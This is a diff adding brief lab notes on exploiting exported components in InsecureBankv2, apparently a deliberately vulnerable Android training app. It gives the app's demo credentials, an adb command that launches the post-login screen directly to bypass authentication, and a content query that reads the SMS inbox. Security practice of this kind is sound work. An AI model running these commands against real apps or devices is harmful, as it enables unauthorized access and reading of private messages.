@@ -1,0 +1,7 @@
+--- [ EXPLOITING EXPORTED COMPONENTS ] ---
+Use the credentials dinesh/Dinesh@123$ or jack/Jack@123$
+
+adb shell am start -n com.android.insecurebankv2/.PostLogin
+
+adb shell, then:
+content query --uri content://sms/inbox
